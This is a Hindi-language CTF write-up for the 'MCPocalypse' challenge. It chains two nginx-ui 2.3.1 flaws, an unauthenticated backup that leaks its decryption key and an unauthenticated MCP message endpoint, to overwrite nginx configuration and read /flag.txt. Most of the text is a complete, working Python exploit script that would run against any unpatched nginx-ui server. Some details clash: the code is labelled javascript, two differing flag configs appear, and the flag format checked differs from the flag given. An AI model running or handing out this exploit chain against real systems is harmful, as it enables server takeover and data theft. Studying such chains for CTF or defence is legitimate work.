# [web] MCPocalypse

> **श्रेणी:** `web`  
> **CTF:** KubSTU CTF 2026 Spring

## विवरण

«CapyTech Solutions» का दावा है कि उनका AI आधे शब्द से 
कमांड समझता है। आप बस कह सकते हैं: «Nginx रीस्टार्ट करो!», और सर्वर 
मान लेगा।

# Writeup

## परिचय

यह राइटअप CTF-चुनौती "Capy CTF: The Secret Node" का समाधान वर्णन करता है, जो `nginx-ui` संस्करण 2.3.1 में दो गंभीर भेद्यताओं की श्रृंखला पर आधारित है। चुनौती का लक्ष्य — इन भेद्यताओं का उपयोग करके रिमोट कोड एक्ज़ीक्यूशन (RCE) या फ़ाइल डिस्क्लोज़र हासिल कर `nginx_ui` कंटेनर के अंदर `/flag.txt` फ़ाइल में स्थित फ़्लैग प्राप्त करना।

## भेद्यताओं का अवलोकन

CTF-चुनौती निम्नलिखित भेद्यता श्रृंखला का शोषण करती है:

### 1. CVE-2026-27944: अप्रमाणित बैकअप और कुंजी का खुलासा

CVE-2026-27944 भेद्यता अप्रमाणित उपयोगकर्ता को `/api/backup` एंडपॉइंट तक पहुँचने की अनुमति देती है। यह एंडपॉइंट एक एन्क्रिप्टेड आर्काइव लौटाता है जिसमें `nginx-ui` इंस्टॉलेशन का पूरा बैकअप है, `app.ini` फ़ाइल सहित। महत्वपूर्ण बात यह है कि AES-256-CBC डिक्रिप्शन के लिए कुंजी और इनिशियलाइज़ेशन वेक्टर (IV) रिस्पॉन्स हेडर `X-Backup-Security` में खुले रूप में भेजे जाते हैं।

प्राप्त कुंजियों से आर्काइव डिक्रिप्ट करके, `app.ini` फ़ाइल निकाली जा सकती है, जिसमें `Node.Secret` है — अगली भेद्यता के शोषण के लिए आवश्यक सीक्रेट।

विस्तृत जानकारी यहाँ <https://github.com/advisories/GHSA-g9w5-qffc-6762>

### 2. CVE-2026-33032 ("MCPwn"): अप्रमाणित MCP संदेश हैंडलर

CVE-2026-33032 भेद्यता, जिसे "MCPwn" भी कहा जाता है, `/mcp_message` एंडपॉइंट में प्रमाणीकरण जाँच (`AuthRequired()` middleware) की कमी से संबंधित है। `nginx-ui` Nginx प्रबंधन के लिए MCP (Model Context Protocol) प्रोटोकॉल का उपयोग करता है, जो 12 विशेषाधिकार प्राप्त प्रबंधन उपकरण प्रदान करता है।

पहले चरण में प्राप्त `Node.Secret` का उपयोग करके, हमलावर `sessionId` प्राप्त करने के लिए `/mcp` के साथ अप्रमाणित SSE-सत्र स्थापित कर सकता है। फिर, इस `sessionId` के साथ `/mcp_message` पर POST-रिक्वेस्ट भेजकर, बिना किसी प्रमाणीकरण के कोई भी विशेषाधिकार प्राप्त MCP उपकरण कॉल किया जा सकता है। इससे Nginx कॉन्फ़िगरेशन फ़ाइलों को ओवरराइट (`nginx_config_modify`) और सर्वर रीलोड (`reload_nginx`) करना संभव हो जाता है, जो रिमोट कोड एक्ज़ीक्यूशन या फ़ाइल डिस्क्लोज़र की ओर ले जाता है।

## भेद्यता श्रृंखला

### CVE-2026-27944 — अप्रमाणित बैकअप एंडपॉइंट + कुंजी का खुलासा

`GET /api/backup` को प्रमाणीकरण की आवश्यकता नहीं। यह एंडपॉइंट nginx-ui इंस्टॉलेशन का पूरा एन्क्रिप्टेड बैकअप लौटाता है — `app.ini` सहित — और AES-256-CBC डिक्रिप्शन कुंजी तथा IV को **खुले रूप में** रिस्पॉन्स हेडर में भेजता है:

```
X-Backup-Security: <base64_key>:<base64_iv>
```

```go
r.GET("/backup", CreateBackup)   // ❌ कोई middleware नहीं
r.POST("/restore", middleware.EncryptedForm(), RestoreBackup)
```

सोर्स कोड से (`api/backup/router.go`):

बैकअप डिक्रिप्ट करने पर `app.ini` मिलता है, जिसमें `[node] Secret` है, चरण 2 के लिए आवश्यक।

### CVE-2026-33032 «MCPwn» — अप्रमाणित MCP संदेश हैंडलर

nginx-ui v2.3.x में **Model Context Protocol (MCP)** इंटरफ़ेस जोड़ा गया, जो 12 nginx प्रबंधन उपकरण प्रदान करता है। `mcp/router.go` में एक छूटी हुई middleware कॉल में त्रुटि है:

```go
r.Any("/mcp",         middleware.IPWhiteList(), middleware.AuthRequired(), ...)
r.Any("/mcp_message", middleware.IPWhiteList(), ...)   // ❌ AuthRequired() छूट गया
```

### श्रृंखला कैसे काम करती है

---

नोड सीक्रेट से प्राप्त `sessionId` होने पर, हमलावर `/mcp_message` पर बिना किसी क्रेडेंशियल के POST-रिक्वेस्ट भेज सकता है और कोई भी विशेषाधिकार प्राप्त उपकरण कॉल कर सकता है — `nginx_config_modify` और `reload_nginx` सहित।

---

 ![img_1.png](./images/img_1.png)

## समाधान

### चरण 1: `Node.Secret` निकालना (CVE-2026-27944)

---

पहला कदम — `app.ini` से `Node.Secret` प्राप्त करना। यह `nginx-ui` (पोर्ट 9000) के `/api/backup` पर अप्रमाणित GET-रिक्वेस्ट भेजकर किया जाता है। रिस्पॉन्स के `X-Backup-Security` हेडर में base64-एन्कोडेड AES-कुंजी और IV होंगे। फिर:

1. base64 से कुंजी और IV डिकोड करें।
2. प्राप्त कुंजी और IV के साथ AES CBC मोड में एन्क्रिप्टेड ZIP-आर्काइव डिक्रिप्ट करें।
3. डिक्रिप्टेड आर्काइव से `app.ini` फ़ाइल निकालें।
4. `app.ini` फ़ाइल की `[node]` सेक्शन से `Secret` का मान पढ़ें।

इस CTF में `Node.Secret` होगा 

भेद्यता की विस्तृत जानकारी <https://github.com/advisories/GHSA-g9w5-qffc-6762>

लेकिन `Node.Secret` प्राप्त करने के लिए तैयार एक्सप्लॉइट है <https://github.com/Skynoxk/CVE-2026-27944>

```javascript
[*] CVE-2026-27944 — downloading backup from Nginx-UI (no auth)
[+] AES key+IV from header: 7jeJX3Ph8q4/IpdY...:nuPm7h3U...
[+] Node secret extracted: sicret-ctf-capy-key-2026
```

### चरण 2: Nginx कॉन्फ़िगरेशन में संशोधन और फ़्लैग प्राप्ति (CVE-2026-33032)

`MCPSession` क्लास और `mcp_swap` फंक्शन इस चरण को कार्यान्वित करते हैं:

1. **MCP-सत्र स्थापित करना**: `base_url` और `node_secret` के साथ `MCPSession` ऑब्जेक्ट बनाया जाता है। `connect()` मेथड `node_secret` पैरामीटर के साथ `f"{self.base_url}/mcp"` पर `GET` रिक्वेस्ट भेजता है। रिस्पॉन्स SSE-स्ट्रीम में `sessionId` पार्स किया जाता है।

   ```python
   self._sse_resp = requests.get(
       f"{self.base_url}/mcp",
       params={"node_secret": self.node_secret},
       stream=True, timeout=5,
   )
   # ... SSE-स्ट्रीम से sessionId पार्सिंग
   ```
2. **Nginx कॉन्फ़िगरेशन में संशोधन**: `call_tool` मेथड का उपयोग प्राप्त `sessionId` के साथ `f"{self.base_url}/mcp_message"` पर `POST` रिक्वेस्ट भेजने के लिए किया जाता है। `payload` के रूप में `nginx_config_modify` मेथड कॉल करने वाला JSON-RPC रिक्वेस्ट भेजा जाता है।

   ```python
   # ... mcp_swap के अंदर
   r = sess.call_tool(
       "nginx_config_modify",
       {"relative_path": config_file, "content": new_content, "sync_overwrite": False},
       msg_id=2,
   )
   ```

   **`nginx_config_modify` के लिए पेलोड**: `new_content` — नई Nginx कॉन्फ़िगरेशन वाली स्ट्रिंग। फ़्लैग प्राप्त करने के लिए निम्नलिखित `FLAG_CONFIG` उपयोग किया जाता है:

   ```nginx
   server {
       listen 80;
       server_name localhost;
   
       location / {
           proxy_pass http://webapp:80;
           proxy_set_header Host $host;
           proxy_set_header X-Real-IP $remote_addr;
           proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
           proxy_set_header X-Forwarded-Proto $scheme;
       }
   
       location /flag {
           alias /flag.txt;
           internal;
       }
   
       location /get_flag {
           rewrite ^ /flag break;
       }
   }
   ```
   - `location /flag { alias /flag.txt; internal; }`: यह ब्लॉक Nginx को बताता है कि `/flag` रिक्वेस्ट पर `/flag.txt` फ़ाइल की सामग्री देनी है। `internal` निर्देश इस `location` को केवल Nginx के आंतरिक रीडायरेक्ट या सब-रिक्वेस्ट के लिए उपलब्ध बनाता है, बाहर से सीधी पहुँच रोकता है।
   - `location /get_flag { rewrite ^ /flag break; }`: यह ब्लॉक सार्वजनिक रूप से उपलब्ध `/get_flag` एंडपॉइंट बनाता है। `rewrite ^ /flag break;` निर्देश `/get_flag` URL को `/flag` में बदलता है और आगे के rewrite नियमों की प्रोसेसिंग रोकता है। चूँकि `/flag` `internal` है, Nginx आंतरिक रूप से इसे प्रोसेस करता है, सार्वजनिक `/get_flag` एंडपॉइंट के माध्यम से `/flag.txt` की सामग्री देता है।
3. **Nginx रीलोड**: कॉन्फ़िगरेशन बदलने के बाद, परिवर्तन लागू करने के लिए `call_tool` के माध्यम से `reload_nginx` मेथड कॉल किया जाता है। यह अत्यंत महत्वपूर्ण है, क्योंकि Nginx रीलोड तक कॉन्फ़िगरेशन परिवर्तन लागू नहीं करता।

   ```python
   r = sess.call_tool("reload_nginx", {}, msg_id=3)
   ```
4. **फ़्लैग प्राप्ति**: Nginx के सफल रीलोड के बाद, स्क्रिप्ट `f"{webapp_url}/get_flag"` (जैसे, `http://localhost:8080/get_flag`) पर `GET` रिक्वेस्ट भेजती है। चूँकि `webapp` अब संशोधित Nginx कॉन्फ़िगरेशन सर्व कर रहा है, यह रिक्वेस्ट `/flag.txt` की सामग्री लौटाएगा।

   ```python
   flag_resp = requests.get(f"{webapp_url}/get_flag", timeout=10)
   flag = flag_resp.text.strip()
   ```

```javascript
import argparse
import base64
import configparser
import io
import json
import re
import sys
import threading
import time
import zipfile

import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# ── Config templates ──────────────────────────────────────────────────────────

ORIGINAL_CONFIG = """\
server {
    listen 80;
    server_name localhost;

    location / {
        proxy_pass http://webapp:80;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
"""

FLAG_CONFIG = """\
server {
    listen 80;
    server_name localhost;

    location / {
        proxy_pass http://webapp:80;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    # Public endpoint to read the flag
    location /get_flag {
        alias /flag.txt;
    }
}
"""

# CVE-2026-27944: unauthenticated backup → node secret

def extract_node_secret(base_url: str) -> str:
    """
    GET /api/backup with no credentials.
    Decrypt the response using the key from X-Backup-Security header.
    Return the [node] Secret from app.ini inside the archive.
    """
    print("[*] CVE-2026-27944 — downloading backup from Nginx-UI (no auth)")
    resp = requests.get(f"{base_url}/api/backup", timeout=30)
    resp.raise_for_status()

    security_header = resp.headers.get("X-Backup-Security", "")
    if not security_header:
        raise RuntimeError("X-Backup-Security header missing — is this v2.3.1?")

    b64_key, b64_iv = security_header.split(":")
    key = base64.b64decode(b64_key)
    iv  = base64.b64decode(b64_iv)
    print(f"[+] AES key+IV from header: {b64_key[:16]}...:{b64_iv[:8]}...")

    outer = zipfile.ZipFile(io.BytesIO(resp.content))

    nginx_ui_enc = outer.read("nginx-ui.zip")
    cipher = AES.new(key, AES.MODE_CBC, iv)
    nginx_ui_zip = unpad(cipher.decrypt(nginx_ui_enc), AES.block_size)

    inner = zipfile.ZipFile(io.BytesIO(nginx_ui_zip))
    app_ini_path = next(n for n in inner.namelist() if n.endswith("app.ini"))
    app_ini_data = inner.read(app_ini_path).decode()

    cfg = configparser.RawConfigParser()
    cfg.read_string(app_ini_data)
    secret = cfg.get("node", "Secret", fallback="").strip()
    if not secret:
        raise RuntimeError("Could not find [node] Secret in extracted app.ini")

    print(f"[+] Node secret extracted: {secret}")
    return secret


# CVE-2026-33032: unauthenticated MCP → nginx config overwrite

class MCPSession:
    """Persistent SSE connection for unauthenticated MCP tool calls."""

    def __init__(self, base_url: str, node_secret: str):
        self.base_url = base_url.rstrip("/")
        self.node_secret = node_secret
        self.session_id: str | None = None
        self._sse_resp = None
        self._iter = None
        self._thread: threading.Thread | None = None
        self.messages: list[dict] = []
        self._lock = threading.Lock()

    def connect(self) -> None:
        self._sse_resp = requests.get(
            f"{self.base_url}/mcp",
            params={"node_secret": self.node_secret},
            stream=True, timeout=5,
        )
        self._sse_resp.raise_for_status()
        self._iter = self._sse_resp.iter_lines()
        for raw in self._iter:
            line = raw.decode() if isinstance(raw, bytes) else raw
            if line.startswith("data:"):
                m = re.search(r"sessionId=([a-zA-Z0-9_-]+)", line[5:])
                if m:
                    self.session_id = m.group(1)
                    break
        if not self.session_id:
            raise RuntimeError("No sessionId — wrong node_secret?")
        self._thread = threading.Thread(target=self._drain, daemon=True)
        self._thread.start()

    def _drain(self) -> None:
        try:
            for raw in self._iter:
                line = raw.decode() if isinstance(raw, bytes) else raw
                if line.startswith("data:"):
                    try:
                        with self._lock:
                            self.messages.append(json.loads(line[5:].strip()))
                    except json.JSONDecodeError:
                        pass
        except Exception:
            pass

    def _post(self, payload: dict) -> None:
        requests.post(
            f"{self.base_url}/mcp_message",
            params={"sessionId": self.session_id},
            json=payload, timeout=10,
        )

    def initialize(self) -> None:
        self._post({
            "jsonrpc": "2.0", "id": 0, "method": "initialize",
            "params": {
                "protocolVersion": "2024-11-05", "capabilities": {},
                "clientInfo": {"name": "MCPwn-PoC", "version": "1.0"},
            },
        })
        self._wait_for(0)
        self._post({"jsonrpc": "2.0", "method": "notifications/initialized", "params": {}})
        time.sleep(0.3)

    def call_tool(self, tool: str, arguments: dict, msg_id: int, wait: float = 5.0) -> dict | None:
        self._post({
            "jsonrpc": "2.0", "id": msg_id, "method": "tools/call",
            "params": {"name": tool, "arguments": arguments},
        })
        return self._wait_for(msg_id, wait)

    def _wait_for(self, msg_id: int, timeout: float = 5.0) -> dict | None:
        deadline = time.time() + timeout
        while time.time() < deadline:
            with self._lock:
                for m in reversed(self.messages):
                    if m.get("id") == msg_id:
                        return m
            time.sleep(0.1)
        return None

    def close(self) -> None:
        if self._sse_resp:
            self._sse_resp.close()


def mcp_swap(base_url: str, node_secret: str, config_file: str, new_content: str) -> None:
    """Open an unauthenticated MCP session and overwrite an nginx config file."""
    sess = MCPSession(base_url, node_secret)
    print("[*] CVE-2026-33032 — opening unauthenticated MCP session (GET /mcp)")
    sess.connect()
    print(f"[+] sessionId: {sess.session_id}")
    sess.initialize()

    print(f"[*] Overwriting {config_file} via POST /mcp_message (no auth)")
    r = sess.call_tool(
        "nginx_config_modify",
        {"relative_path": config_file, "content": new_content, "sync_overwrite": False},
        msg_id=2,
    )
    if r and "error" in r:
        print(f"[!] modify failed: {r['error']['message']}")
        sess.close()
        sys.exit(1)
    print("[+] Nginx config modified.")

    print("[*] Reloading nginx via POST /mcp_message (no auth)")
    r = sess.call_tool("reload_nginx", {}, msg_id=3)
    if r and "error" in r:
        print(f"[!] reload error: {r['error']['message']}")
    else:
        print("[+] Nginx reloaded — config is live")

    sess.close()


def get_flag(nginx_ui_url: str, landing_url: str, config_file: str) -> None:
    print(f"\n{'='*62}")
    print(f"  Capy CTF Exploit Chain (Architecture Fixed)")
    print(f"  Target Nginx-UI (Admin) : {nginx_ui_url}")
    print(f"  Target Landing (Public) : {landing_url}")
    print(f"{'='*62}\n")

    node_secret = extract_node_secret(nginx_ui_url)
    print()

    print("[*] Injecting flag exposure into Landing's Nginx config...")
    mcp_swap(nginx_ui_url, node_secret, config_file, FLAG_CONFIG)
    time.sleep(2) # Give Nginx a moment to reload

    print("[*] Attempting to retrieve flag from Public Landing URL...")
    try:
        flag_resp = requests.get(f"{landing_url}/get_flag", timeout=10)
        flag_resp.raise_for_status()
        flag = flag_resp.text.strip()
        if "CAPY{" in flag:
            print(f"\n[+] FLAG FOUND: {flag}")
        else:
            print(f"[!] Could not retrieve flag. Response: {flag}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Failed to retrieve flag: {e}")

    print("\n[*] Resetting Nginx config to original state...")
    mcp_swap(nginx_ui_url, node_secret, config_file, ORIGINAL_CONFIG)
    print("[+] Exploit complete. Nginx config reset.")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Exploit script for Capy CTF: The Secret Node"
    )
    parser.add_argument("--nginx-ui-url", default="http://localhost:9000",
                        help="nginx-ui admin panel URL (default: http://localhost:9000)")
    parser.add_argument("--landing-url", default="http://localhost:8080",
                        help="Public Capy Landing URL (default: http://localhost:8080)")
    parser.add_argument("--config", default="default.conf",
                        help="nginx config file to overwrite (default: default.conf)")
    args = parser.parse_args()

    try:
        get_flag(args.nginx_ui_url, args.landing_url, args.config)
    except requests.exceptions.ConnectionError:
        print(f"[!] Cannot connect. Is the lab running?", file=sys.stderr)
        sys.exit(1)
    except Exception as exc:
        print(f"[!] An error occurred: {exc}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
```


फ़्लैग: `KubSTU(mcp_h4s_n0_4uth_4nd_1_l0v3_1t)`
